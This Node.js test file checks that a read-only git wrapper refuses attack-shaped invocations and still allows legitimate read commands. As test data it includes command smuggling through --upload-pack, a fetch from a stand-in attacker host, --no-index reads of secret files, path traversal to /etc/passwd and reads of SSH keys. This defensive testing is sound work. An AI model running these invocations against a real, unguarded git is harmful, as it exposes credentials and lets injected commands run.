// Behavior tests for tools/git-ro.mjs (2026-11-13 review round, fix 1): a real temp git repo with
// canary files, every reviewer-demonstrated attack shape run through the REAL wrapper CLI
// (spawnSync, never the shell), asserting observed effects -- the canary output file never gets
// created, the canary secret text never appears in stdout/stderr, and the wrapper refuses (nonzero
// exit) -- not merely that some internal rule string exists. Also covers the ordinary read-only
// subcommands working normally.
// Run: node --test test/git-ro.test.mjs
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { fileURLToPath } from "node:url";

const SCRIPT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "tools", "git-ro.mjs");
const CANARY_SECRET = "CANARY-SECRET-AWOOGA-98765";

let repoDir, outsideDir, outsideSecretFile;

before(() => {
  repoDir = fs.mkdtempSync(path.join(os.tmpdir(), "git-ro-test-repo-"));
  outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), "git-ro-test-outside-"));
  const git = (...args) => {
    const r = spawnSync("git", args, { cwd: repoDir, encoding: "utf8" });
    assert.equal(r.status, 0, `git ${args.join(" ")} failed: ${r.stderr}`);
    return r.stdout;
  };
  git("init", "-q");
  git("config", "user.email", "test@example.com");
  git("config", "user.name", "Test");
  fs.writeFileSync(path.join(repoDir, "tracked.txt"), "hello world\n");
  git("add", "tracked.txt");
  git("commit", "-q", "-m", "init");
  // An untracked secret sitting in the working directory -- never committed, but still on disk,
  // which is exactly what `git diff --no-index` can read regardless of tracking state.
  fs.writeFileSync(path.join(repoDir, ".env"), `SECRET=${CANARY_SECRET}\n`);
  outsideSecretFile = path.join(outsideDir, "outside-secret.txt");
  fs.writeFileSync(outsideSecretFile, `${CANARY_SECRET}\n`);
});

after(() => {
  fs.rmSync(repoDir, { recursive: true, force: true });
  fs.rmSync(outsideDir, { recursive: true, force: true });
});

function run(args) {
  return spawnSync(process.execPath, [SCRIPT, ...args], { cwd: repoDir, encoding: "utf8", timeout: 20_000 });
}

function assertRefused(args, { outputFile } = {}) {
  const r = run(args);
  assert.notEqual(r.status, 0, `expected a refusal for ${JSON.stringify(args)}, got exit 0: stdout=${r.stdout}`);
  assert.ok(!(r.stdout || "").includes(CANARY_SECRET), `canary secret leaked to stdout for ${JSON.stringify(args)}`);
  assert.ok(!(r.stderr || "").includes(CANARY_SECRET), `canary secret leaked to stderr for ${JSON.stringify(args)}`);
  if (outputFile) assert.ok(!fs.existsSync(path.join(repoDir, outputFile)), `${outputFile} must not have been created by ${JSON.stringify(args)}`);
}

// --- Reviewer-demonstrated attacks (fix 1) -----------------------------------------------------

test("git log -1 --output=<file> is refused, no file written", () => {
  assertRefused(["log", "-1", "--output=pwned-log.txt"], { outputFile: "pwned-log.txt" });
});

test("git log -1 --output <file> (two-token form) is refused, no file written", () => {
  assertRefused(["log", "-1", "--output", "pwned-log2.txt"], { outputFile: "pwned-log2.txt" });
});

test("git diff --output=<file> is refused, no file written", () => {
  assertRefused(["diff", "--output=pwned-diff.txt"], { outputFile: "pwned-diff.txt" });
});

test("git show REV:path --output=<file> is refused, no file written", () => {
  assertRefused(["show", "HEAD:tracked.txt", "--output=pwned-show.txt"], { outputFile: "pwned-show.txt" });
});

test("git fetch --upload-pack=<cmd> . is refused (fetch is not a known subcommand at all)", () => {
  assertRefused(["fetch", "--upload-pack=touch pwned-fetch.txt", "."], { outputFile: "pwned-fetch.txt" });
});

test("git fetch https://attacker/... is refused (fetch is not a known subcommand at all)", () => {
  assertRefused(["fetch", "https://attacker.example/evil.git"]);
});

test("git fetch . HEAD:refs/heads/x is refused (fetch is not a known subcommand at all)", () => {
  assertRefused(["fetch", ".", "HEAD:refs/heads/x"]);
});

test("git diff --no-index NUL <file outside the repo> is refused, canary secret not read", () => {
  assertRefused(["diff", "--no-index", "NUL", outsideSecretFile]);
});

test("git diff --no-index on an untracked in-repo secret is refused", () => {
  assertRefused(["diff", "--no-index", "NUL", ".env"]);
});

test("git diff --ext-diff is refused", () => {
  assertRefused(["diff", "--ext-diff"]);
});

test("git log -p --textconv is refused (textconv is always force-disabled anyway)", () => {
  assertRefused(["log", "-p", "--textconv"]);
});

// --- Additional always-deny flags (fix 1's explicit list) -------------------------------------

test("-c, -C, --exec-path, --git-dir, --work-tree are all refused on every subcommand", () => {
  for (const flag of ["-c", "-C", "--exec-path", "--git-dir", "--work-tree"]) {
    assertRefused(["status", `${flag}=x`]);
    assertRefused(["status", flag, "x"]);
  }
});

// --- Pathspec/REV:path containment and secret-pattern refusal ---------------------------------

test("a pathspec escaping the repo via .. is refused", () => {
  assertRefused(["log", "--", "../../etc/passwd"]);
});

test("a REV:path naming a secret-shaped file is refused even without an output flag", () => {
  assertRefused(["show", "HEAD:.env"]);
  assertRefused(["show", "HEAD:prod.env"]);
  assertRefused(["show", "HEAD:.env.local"]);
  assertRefused(["show", "HEAD:.ssh/id_rsa"]);
});

test("an absolute Windows path is refused", () => {
  assertRefused(["diff", "C:\\Windows\\win.ini"]);
});

// --- Normal, legitimate use still works ---------------------------------------------------------

test("status is no longer exposed", () => { assertRefused(["status", "--short"]); });

test("diff requires two commits and excludes working tree changes", () => {
 fs.writeFileSync(path.join(repoDir, "tracked.txt"), "UNCOMMITTED_CANARY");
 assertRefused(["diff"]); assertRefused(["diff", "HEAD"]);
 const r = run(["diff", "HEAD", "HEAD"]);
 assert.equal(r.status, 0, r.stderr); assert.equal(r.stdout, "");
});

test("git log works normally and shows the commit", () => {
  const r = run(["log", "--oneline"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /init/);
});

test("git show works normally against HEAD", () => {
  const r = run(["show", "--stat", "HEAD"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /init/);
});

test("git rev-parse --abbrev-ref HEAD works normally", () => {
  const r = run(["rev-parse", "--abbrev-ref", "HEAD"]);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout.trim(), /^(main|master)$/);
});

test("branch list / remote -v / worktree list all work and admit no extra arguments", () => {
  assert.equal(run(["branch", "list"]).status, 0);
  assert.equal(run(["remote", "-v"]).status, 0);
  assert.equal(run(["worktree", "list"]).status, 0);
  assertRefused(["branch", "list", "extra"]);
  assertRefused(["remote", "-v", "extra"]);
  assertRefused(["worktree", "list", "extra"]);
});

test("the main-module guard runs the CLI whether invoked with backslashes or forward slashes", () => {
  const forwardSlash = SCRIPT.replace(/\\/g, "/");
  const r = spawnSync(process.execPath, [forwardSlash, "log", "--oneline"], { cwd: repoDir, encoding: "utf8" });
  assert.equal(r.status, 0, `forward-slash invocation must still run the CLI: stdout=${JSON.stringify(r.stdout)} stderr=${JSON.stringify(r.stderr)}`);
});
